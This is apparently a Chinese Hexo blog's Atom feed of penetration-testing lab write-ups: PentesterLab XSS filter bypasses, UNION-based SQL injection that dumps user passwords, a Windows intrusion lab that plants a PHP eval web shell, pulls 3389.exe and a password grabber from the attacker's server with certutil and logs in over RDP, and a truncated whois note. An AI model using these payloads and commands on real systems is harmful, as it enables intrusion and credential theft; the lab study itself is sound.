<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-10T02:44:28.410Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pentester靶场学习writup</title>
    <link href="http://yoursite.com/2020/08/05/Pentester/"/>
    <id>http://yoursite.com/2020/08/05/Pentester/</id>
    <published>2020-08-05T08:29:15.000Z</published>
    <updated>2020-08-10T02:44:28.410Z</updated>
    
    <content type="html"><![CDATA[<p>最近发现了一个新的靶场Pentester，感觉都比较基础，闲的没事刷一下，巩固一下基础。</p><h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p><a href="https://pentesterlab.com/exercises/web_for_pentester/course">官方网址下载地址</a></p><p>环境部署都很简单，可以直接下载iso镜像文件，丢到虚拟机里就好了。安装好环境后查看一下IP</p><p><img src="https://i.loli.net/2020/08/05/JWVh9YUH1csLqF3.png"></p><p>默认端口为80端口</p><p><img src="https://i.loli.net/2020/08/05/ULgQvYtrn8J26G5.png"></p><p>然后就可以愉快地玩耍了</p><h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>这关很简单，没有任何过滤，直接在URL中插入script代码就可以弹框。Payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/C59G1igRem6Vuyb.png"></p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name变量通过GET方式直接传入并且输出，没有进行任何过滤</p><h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>第二关看上去和第一关没什么两样嘛，使用第一关的方法再试一次</p><p><img src="https://i.loli.net/2020/08/05/LkgiQa4AnsUHltj.png"></p><p>呕吼，很明显第二关对script标签进行了过滤。针对script标签过滤，我第一个想到的是大小写绕过和双写绕过，我们先去看一下第二关的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $name =  $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $name = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>, $name);</span><br><span class="line">        $name = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>, $name);</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用了preg_replace函数来过滤script标签，但是由于正则的缺陷，没有考虑到大小写的情况，所以这里可以用大小写转换绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace:函数执行一个正则表达式的搜索和替换。</span><br><span class="line">preg_replace(a,b,c):a为一个正则表达式，b为替换成的内容，c为被替换的目标变量；以a正则表达式为基准，用b替换c变量中符合a正则表达式的内容</span><br><span class="line">  </span><br><span class="line">本关就是使用空格符代替$name中含有&lt;script&gt;和&lt;/script&gt;的内容</span><br></pre></td></tr></table></figure><p>我们可以通过大小写进行绕过，Payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;ScRiPt&gt;alert(<span class="number">123</span>)&lt;/ScRiPt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/pTBkG6Iai4UjbJR.png"></p><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>第三关源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $name =  $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $name = preg_replace(<span class="string">&quot;/&lt;script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>, $name);</span><br><span class="line">        $name = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>, $name);</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在第二关的基础上加上了/i，表示不区分大小写。这下我们就只能通过嵌套script标签的方式绕过了，Payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;scr&lt;script&gt;ipt&gt;alert(<span class="number">123</span>)&lt;<span class="regexp">/scr&lt;/</span>script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/7PcrLwvKutkdUjm.png"></p><p><font color="red">踩的坑：</font></p><p>因为过滤了script标签，所以我一开始是这样构造嵌套双写的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;alert(<span class="number">123</span>)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>然后发现仍然被过滤的严严实实，其实是我sb了，源码中的正则是带&lt;&gt;的所以只有嵌套&lt;script&gt;才会过滤嵌套的内容。</p><h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h2><p>第四关源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/script/i&#x27;</span>, $_GET[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> $_GET[<span class="string">&quot;name&quot;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第四关调用了die(error)，只要匹配到script就终止进程，连双写的机会都不给我，这样的话我们就只能放弃掉script标签了，改用其他方法，如&lt;img src&gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">a</span> <span class="attr">onerror</span>=<span class="string">alert(123)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;img src&gt;标签具体的含义这里就不解释了，很基础，直接写Payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">a</span> <span class="attr">onerror</span>=<span class="string">alert(123)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/uxHzV3eyvRFbt5g.png"></p><h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/alert/i&#x27;</span>, $_GET[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> $_GET[<span class="string">&quot;name&quot;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和第四关大致相同，只要匹配到alert就终止进程，所以payload中不能存在alert()，但是我们可以使用其他函数来代替alert()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt()</span><br><span class="line">confirm()</span><br></pre></td></tr></table></figure><p>Payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;script&gt;prompt(<span class="number">123</span>)&lt;/script&gt;</span><br><span class="line">?name=hacker&lt;script&gt;confirm(<span class="number">123</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>另一种方法：通过编码的方式绕过alert过滤</p><p>hackbar自带String.fromCharCode()编码功能，可以通过编码绕过过滤</p><p><img src="https://i.loli.net/2020/08/05/NdBUH6gi8yEKqcY.png" alt="WX20200805-182042@2x.png"></p><p>Payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;script&gt;<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">41</span>))&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/CIXU1whEtyYuWcG.png"></p><h2 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h2><p>第六关可以不用看源码，直接构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>页面并不弹窗，页面回显如下</p><p><img src="https://i.loli.net/2020/08/05/Z8LYFs9rwbXU1Ve.png"></p><p>多了一个”;    看到这个我第一个想到的是由于闭合不完全造成的，查看源码</p><p><img src="https://i.loli.net/2020/08/05/IyK2iR1Gkpf8JMP.png" alt="WX20200805-183226@2x.png"></p><p>红色方框内为我插入的payload，可见多了一个&lt;script&gt;没有闭合，完善payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker<span class="string">&quot;&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/yA7gnxiMcsBDpR2.png"></p><h2 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h2><p>第六关我们直接插入&lt;script&gt;标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="number">123</span>&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>没有弹窗，页面源码如下</p><p><img src="https://i.loli.net/2020/08/05/hrSzj9ZfQD3WGYP.png" alt="WX20200805-213137@2x.png"></p><p>发现对尖括号进行了实体化，所以带尖括号的标签都不能用，但是我发现输入框前后带了&lt;script&gt;，可以构造闭合后直接插入alert，payload如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="number">123</span><span class="string">&#x27;; alert(123);&#x27;</span></span><br><span class="line">或者</span><br><span class="line">?name=<span class="number">123</span><span class="string">&#x27;; alert(123)//        </span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/dEkqt5OaSsWMwZJ.png"></p><h2 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h2><p>第八关我纠结了好久，试了各种标签，html事件，直到我看了源码…源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;HELLO &quot;</span>.htmlentities($_POST[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">Your name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>$name通过POST方式传入，然后通过htmlentities()实体化，所以$name处基本不存在xss弹框的可能性了。但是我发现了&lt;form&gt;表单中有$_SERVER[‘PHP_SELF’]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP_SELF是一个返回正在执行的当前脚本的变量。此变量返回当前文件的名称和路径（来自根文件夹），比如</span><br><span class="line">假设您的php文件位于以下地址：http:&#x2F;&#x2F;www.yourserver.com&#x2F;form-action.php，在这种情况下，echo $_SERVER[&#39;PHP_SELF&#39;]输出为&quot;&#x2F;form-action.php&quot;</span><br><span class="line">假设您的php文件位于以下地址：http:&#x2F;&#x2F;www.yourserver.com&#x2F;dir1&#x2F;form-action.php，在这种情况下，echo $_SERVER[&#39;PHP_SELF&#39;]输出为&quot;&#x2F;dir1&#x2F;form-action.php&quot;</span><br></pre></td></tr></table></figure><p>详细介绍$_SERVER[‘PHP_SELF’]以及其形成的漏洞的原因可以参考下面这篇文章：</p><p><a href="https://www.jianshu.com/p/b0c8ae980fea">$_SERVER[‘PHP_SELF’]漏洞</a></p><p>在第八关的源码中，我发现用户依然可以控制参数PHP_SELF，且没有对PHP_SELF进行过滤，我们可以在url中插入xss代码达到弹窗的目的，构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example8.php/<span class="string">&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;//</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">example8.php/&quot;</span> onclick=alert(<span class="number">123</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/05/ZfoEWjGgPAd8IrM.png"></p><h2 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h2><p>第九关源码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接通过location.hash传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性往网页中写入 JS 代码。要了解这个location.hash属性，可以参考 W3C 的这篇资料：<a href="https://www.w3school.com.cn/jsref/prop_loc_hash.asp">HTML DOM hash 属性</a></p><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example9.php#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><u><strong>执行完成后，手动刷新下浏览器，经测试在 Chrome 和 FireFox 浏览器上的尖括号会被自动转码，在<code>IE</code>内核的浏览器上可以正常运行</strong></u></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>SQL注入第一关很基础，构造<code>?name=root&#39;</code>页面返回错误，构造<code>?name=root&#39;#或者?name=root&#39;--+</code>页面返回正常，所以说明SQL的查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">&#x27;input&#x27;</span></span><br></pre></td></tr></table></figure><p>手工注入的话一步步跑就好了，这里我就直接给出payload，不再进行演示了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?name=root&#x27; order by 5<span class="comment">--+</span></span><br><span class="line">?name=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="comment">--+</span></span><br><span class="line">?<span class="keyword">name</span>=<span class="number">-1</span><span class="string">&#x27; union select user(),version(),database(),4,5--+</span></span><br><span class="line"><span class="string">?name=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="keyword">version</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;exercises&#x27;</span><span class="comment">--+</span></span><br><span class="line">?<span class="keyword">name</span>=<span class="number">-1</span><span class="string">&#x27; union select group_concat(column_name),version(),database(),4,5 from information_schema.columns where table_name=&#x27;</span><span class="keyword">users</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?name=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>),<span class="keyword">group_concat</span>(<span class="keyword">name</span>),<span class="keyword">group_concat</span>(passwd),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>我更喜欢直接上sqlmap</p><p><img src="https://i.loli.net/2020/08/06/iWDt8K9yFjNgB6H.png"></p><h2 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近发现了一个新的靶场Pentester，感觉都比较基础，闲的没事刷一下，巩固一下基础。&lt;/p&gt;
&lt;h1 id=&quot;环境部署&quot;&gt;&lt;a href=&quot;#环境部署&quot; class=&quot;headerlink&quot; title=&quot;环境部署&quot;&gt;&lt;/a&gt;环境部署&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="靶场" scheme="http://yoursite.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>信息收集脑图</title>
    <link href="http://yoursite.com/2020/06/28/information-1/"/>
    <id>http://yoursite.com/2020/06/28/information-1/</id>
    <published>2020-06-28T06:37:10.000Z</published>
    <updated>2020-06-28T06:45:52.990Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2020/06/28/4fPBS6jxOGVqeL1.png" alt="mmexport1592968379703.png"></p><p><img src="https://i.loli.net/2020/06/28/9csLRxG73OQzrvI.png" alt="mmexport1592968375960.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/06/28/4fPBS6jxOGVqeL1.png&quot; alt=&quot;mmexport1592968379703.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/06</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="信息收集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>window入侵试验</title>
    <link href="http://yoursite.com/2020/06/18/window-ruqin/"/>
    <id>http://yoursite.com/2020/06/18/window-ruqin/</id>
    <published>2020-06-18T08:38:35.000Z</published>
    <updated>2020-06-28T06:34:20.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01实验内容"><a href="#0x01实验内容" class="headerlink" title="0x01实验内容"></a>0x01实验内容</h1><ul><li><p>实验靶机IP：10.110.2.20</p></li><li><p>端口探测，发现端口(21，80，3306)</p></li><li><p>通过配置文件获取数据库密码</p></li><li><p>写入一句话木马</p></li><li><p>本地开启一个http服务器，使用蚁剑执行下载命令，从http服务器上下载3389.exe和GetPassword.exe到服务器</p><p>python.exe -m SimpleHTTPServer    //开启http服务</p><p>certutil -urlcache -f -split <a href="http://192.168.100.1:8000/3389.exe">http://192.168.100.1:8000/3389.exe</a></p></li><li><p>执行3389.exe打开服务器3389端口，使用GetPassword.exe获取主机密码</p></li><li><p>远程桌面登录到主机</p></li></ul><h1 id="0x02入侵过程"><a href="#0x02入侵过程" class="headerlink" title="0x02入侵过程"></a>0x02入侵过程</h1><h2 id="登录10-110-2-20"><a href="#登录10-110-2-20" class="headerlink" title="登录10.110.2.20"></a>登录10.110.2.20</h2><p><img src="https://i.loli.net/2020/06/28/AfgylZR2peaFqrG.png" alt="QQ20200628-140640@2x.png"></p><h2 id="使用御剑进行端口扫描"><a href="#使用御剑进行端口扫描" class="headerlink" title="使用御剑进行端口扫描"></a>使用御剑进行端口扫描</h2><p>对10.110.2.20进行端口扫描，发现端口21,80,445,3306</p><p><img src="https://i.loli.net/2020/06/28/uUiYBXSW2fPIOrC.png" alt="QQ20200628-140903@2x.png"></p><h2 id="登陆FTP服务器，查看配置网站配置文件"><a href="#登陆FTP服务器，查看配置网站配置文件" class="headerlink" title="登陆FTP服务器，查看配置网站配置文件"></a>登陆FTP服务器，查看配置网站配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;10.110.2.20        &#x2F;&#x2F;登陆目标服务器</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/TgtjAwxaVJK5dzy.png" alt="QQ20200628-141205@2x.png"></p><p>查看网站配置文件获得数据库密码</p><p><img src="https://i.loli.net/2020/06/28/px9KPN32mIEtliV.png" alt="QQ20200628-141234@2x.png"></p><h2 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/i7yXJHt8wn12oxh.png" alt="QQ20200628-141631@2x.png"></p><h2 id="蚁剑连接一句话木马"><a href="#蚁剑连接一句话木马" class="headerlink" title="蚁剑连接一句话木马"></a>蚁剑连接一句话木马</h2><p><img src="https://i.loli.net/2020/06/28/8IOWtonXcBxeQDM.png" alt="QQ20200628-141833@2x.png"></p><h2 id="本地开启一个http服务器"><a href="#本地开启一个http服务器" class="headerlink" title="本地开启一个http服务器"></a>本地开启一个http服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python.exe -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/PoJglEyNcR4ipWZ.png" alt="QQ20200628-142206@2x.png"></p><h2 id="下载3389-exe和getpassword-exe"><a href="#下载3389-exe和getpassword-exe" class="headerlink" title="下载3389.exe和getpassword.exe"></a>下载3389.exe和getpassword.exe</h2><p>使目标机器访问攻击机，从攻击机下载3389.exe和getpassword.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -f -split http:&#x2F;&#x2F;192.168.100.15:8000&#x2F;3389.exe</span><br><span class="line">certutil -urlcache -f -split http:&#x2F;&#x2F;192.168.100.15:8000&#x2F;getpassword.exe</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/28/CMXdFGukTQ6ZUl3.png" alt="QQ20200628-142233@2x.png"></p><h2 id="运行3389-exe开启33389端口"><a href="#运行3389-exe开启33389端口" class="headerlink" title="运行3389.exe开启33389端口"></a>运行3389.exe开启33389端口</h2><p><img src="https://i.loli.net/2020/06/28/INwJPsxtaKnv4cH.png" alt="QQ20200628-142248@2x.png"></p><h2 id="运行getpassword-exe写入1-txt，获取本机密码"><a href="#运行getpassword-exe写入1-txt，获取本机密码" class="headerlink" title="运行getpassword.exe写入1.txt，获取本机密码"></a>运行getpassword.exe写入1.txt，获取本机密码</h2><p><img src="https://i.loli.net/2020/06/28/Yk9doEXbvjZ6SmV.png" alt="QQ20200628-142802@2x.png"></p><h2 id="连接3389端口"><a href="#连接3389端口" class="headerlink" title="连接3389端口"></a>连接3389端口</h2><p><img src="https://i.loli.net/2020/06/28/DG4RyVJuzvXowkW.png" alt="QQ20200628-142815@2x.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01实验内容&quot;&gt;&lt;a href=&quot;#0x01实验内容&quot; class=&quot;headerlink&quot; title=&quot;0x01实验内容&quot;&gt;&lt;/a&gt;0x01实验内容&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;实验靶机IP：10.110.2.20&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;端</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="window入侵" scheme="http://yoursite.com/tags/window%E5%85%A5%E4%BE%B5/"/>
    
  </entry>
  
  <entry>
    <title>信息收集笔记</title>
    <link href="http://yoursite.com/2020/06/14/information/"/>
    <id>http://yoursite.com/2020/06/14/information/</id>
    <published>2020-06-14T14:46:06.000Z</published>
    <updated>2020-06-14T15:43:33.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-whois查询"><a href="#0x01-whois查询" class="headerlink" title="0x01 whois查询"></a>0x01 whois查询</h1><p>whois查询是用来查询<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>的IP以及<a href="https://baike.baidu.com/item/%E6%89%80%E6%9C%89%E8%80%85/2193463">所有者</a>等信息的<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8048821">传输协议</a>。简单说，whois就是一个用来查询<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C">域名注册</a>商）。通过whois来实现对<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>信息的查询。whois查询可以进行反查，获取更多域名拥有者信息。</p><h2 id="whois-chinaz-com"><a href="#whois-chinaz-com" class="headerlink" title="whois.chinaz.com"></a>whois.chinaz.com</h2><p>URL：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p><img src="https://i.loli.net/2020/06/14/GzpH7e35qTyZt6b.jpg" 